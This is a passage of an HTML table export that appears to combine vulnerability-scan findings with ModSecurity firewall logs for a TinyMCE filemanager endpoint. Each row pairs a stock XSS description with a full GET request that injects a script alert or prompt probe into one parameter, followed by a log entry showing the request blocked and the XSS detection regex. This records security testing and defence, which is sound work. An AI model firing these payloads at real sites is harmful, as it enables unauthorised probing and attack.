</td><td class=xl24 width=64 >2015-04-01 09:29:06</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:05 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:fldr. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(566399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttCawQAW0AABvT@HIAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttCawQAW0AABvT@HIAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366905</td><td class=xl24 width=64 >2015-03-31 22:01:02</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id='&gt;&lt;script&gt;alert(387899)&lt;/script&gt;&lt;!--&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=j9v84fsg6lbmvgstu4qgjhdlm3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:07</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:06 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(387899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttCqwQAW0AAHhB77oAAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttCqwQAW0AAHhB77oAAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366906</td><td class=xl24 width=64 >2015-03-31 22:02:46</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >field_id</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&lt;script&gt;prompt(764299)&lt;/script/&gt;&amp;relative_0=TestName&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=4jtq35h9j1lg2m60ne08mk54n1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:08</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:07 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:field_id. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(764299)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttC6wQAW0AAD9hYOIAAAAC&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttC6wQAW0AAD9hYOIAAAAC</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366907</td><td class=xl24 width=64 >2015-03-31 22:06:12</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_url</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url='&gt;&lt;script&gt;alert(312499)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=ka0s7enqtoae8mqn8btavm6r05
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:10</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:08 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_url. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(312499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttDKwQAW0AAHchlVkAAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttDKwQAW0AAHchlVkAAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366908</td><td class=xl24 width=64 >2015-03-31 22:06:44</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type='&gt;&lt;script&gt;alert(459099)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f5a761a=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=o87qi4t594gra8da19cam416f1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:11</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:10 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(459099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttDqwQAW0AABt@bWEAAAAB&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttDqwQAW0AABt@bWEAAAAB</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366909</td><td class=xl24 width=64 >2015-03-31 22:07:57</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >relative_0</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0='&gt;&lt;script&gt;alert(814299)&lt;/script&gt;&lt;!--&amp;akey=key&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=mdi4dkjfvmj9i4veorj5nc1g61
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:12</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:11 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:relative_0. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(814299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttD6wQAW0AAHgzv0sAAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttD6wQAW0AAHgzv0sAAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366910</td><td class=xl24 width=64 >2015-03-31 22:09:42</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f5a7697</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=&quot;&gt;&lt;script&gt;alert(739499)&lt;/script&gt;&lt;!--&amp;fldr=test/&amp;551ac2f5a7697=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=6ki45psa26pm9mppp66p481de2
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:13</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:12 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(739499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttEKwQAW0AAB7zKNgAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttEKwQAW0AAB7zKNgAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366911</td><td class=xl24 width=64 >2015-03-31 22:11:26</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=&amp;551ac2f5665c6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >akey</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=&quot;&gt;&lt;script&gt;alert(676099)&lt;/script&gt;&lt;!--&amp;fldr=TestName&amp;551ac2f5665c6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=lp5mrtp28ecm6g57trbgf3bi36
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:29:15</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:29:13 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:akey. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(676099)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttEawQAW0AAHhGMuEAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttEawQAW0AAHhGMuEAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366912</td><td class=xl24 width=64 >2015-03-31 22:11:42</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
